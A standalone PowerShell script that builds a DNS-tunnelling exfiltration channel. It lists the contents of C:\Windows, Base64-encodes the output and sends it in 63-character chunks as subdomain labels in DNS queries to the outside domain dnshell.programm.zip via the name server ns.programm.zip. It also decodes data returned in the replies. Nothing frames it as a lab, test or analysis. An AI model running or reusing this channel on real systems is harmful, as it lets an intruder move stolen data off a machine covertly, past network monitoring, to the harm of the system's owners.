
$data = Get-Childitem C:\Windows | Out-String

$timestamp = [DateTime]::UtcNow.ToString("yyyyMMddHHmmss")
$domain = "dnshell.programm.zip"

# Encode data as Base64
$encodedData = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($data))

# Replace padding characters with _ so it can be transmitted over DNS
$encodedData = $encodedData.Replace("=", "_")

$chunks = [Math]::Ceiling($encodedData.Length / 63) # Calculate the number of chunks

for ($i = 0; $i -lt $chunks; $i++) {
    $currentChunk = $encodedData.Substring($i * 63, [Math]::Min(63, $encodedData.Length - $i * 63))
    $query = "$i.$chunks.$timestamp.$domain"
    $dnsQuery = "$currentChunk.$query"

    # Send DNS query
    $dnsResult = Resolve-DnsName -Name $dnsQuery -Server ns.programm.zip

    if ($dnsResult) {
        $response = $dnsResult.Strings | Where-Object { $_ -like "*.partialdata.*" }
        $decodedResponse = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($response.Substring(0, $response.Length - 9)))
        Write-Output $decodedResponse
    }
}